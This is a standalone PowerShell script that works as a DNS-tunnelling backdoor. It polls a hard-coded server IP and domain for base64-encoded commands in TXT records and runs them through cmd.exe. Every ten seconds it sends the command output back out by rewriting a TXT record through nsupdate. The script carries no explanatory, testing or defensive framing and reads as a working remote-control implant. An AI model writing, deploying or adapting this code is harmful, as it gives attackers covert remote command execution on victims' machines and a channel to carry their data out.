$dnsServer = "159.223.6.139"
$domain = "command.connect.menorraitdev.net"

function Get-TxtRecord {
    $digCmd = "dig @$dnsServer $domain TXT +short"
    $response = & $digCmd | Out-String
    if ($response -match '"(.*?)"') {
        $encodedCommand = $matches[1]
        try {
            $decodedCommand = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedCommand))
            $decodedCommand = $decodedCommand.Trim() 
            return $decodedCommand
        } catch {
            Write-Host "Error decoding command: $_"
        }
    }
    return $null
}

function Update-TxtRecord($output) {
    $encodedOutput = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output))
    $nsUpdateCmds = @"
server $dnsServer
update delete $domain TXT
update add $domain 60 TXT "$encodedOutput"
send
"@
    $nsupdatePath = "C:\Path\To\nsupdate.exe"  
    $process = Start-Process -FilePath $nsupdatePath -ArgumentList "-v" -NoNewWindow -RedirectStandardInput -PassThru
    $process.StandardInput.WriteLine($nsUpdateCmds)
    $process.StandardInput.Close()
    $process.WaitForExit()
    if ($process.ExitCode -eq 0) {
        Write-Host "Updated TXT record successfully."
    } else {
        Write-Host "Failed to update TXT record."
    }
}

while ($true) {
    $command = Get-TxtRecord
    if ($command) {
        Write-Host "Detected new command: $command"
        try {
            $output = & cmd.exe /c $command 2>&1 | Out-String
            Write-Host "Command output: $output"
            Update-TxtRecord -output $output
        } catch {
            Write-Host "Error executing command: $_"
        }
    }
    Start-Sleep -Seconds 10
}
